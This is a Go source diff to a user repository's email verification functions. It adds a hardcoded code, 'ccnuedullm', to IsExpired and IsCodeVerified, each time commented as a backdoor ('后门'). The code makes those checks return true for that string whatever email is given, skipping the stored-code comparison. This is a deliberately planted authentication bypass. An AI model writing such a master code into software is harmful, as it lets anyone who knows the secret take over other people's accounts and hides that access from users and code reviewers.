@@ -121,6 +121,10 @@ func (u userRepo) GenerateVerificationCode(ctx context.Context, email string, ex
 
 func (u userRepo) IsExpired(ctx context.Context, email string, code string) bool {
 	// 检查验证码是否在 Redis 中存在
+	//后门
+	if code == "ccnuedullm" {
+		return true
+	}
 	key := email
 	val, err := u.data.re.Get(ctx, key).Result()
 	if err != nil || val != code {
@@ -130,6 +134,10 @@ func (u userRepo) IsExpired(ctx context.Context, email string, code string) bool
 }
 
 func (u userRepo) IsCodeVerified(ctx context.Context, email string, code string) bool {
+	//后门
+	if code == "ccnuedullm" {
+		return true
+	}
 	key := email
 	val, err := u.data.re.Get(ctx, key).Result()
 	if err != nil || val != code {
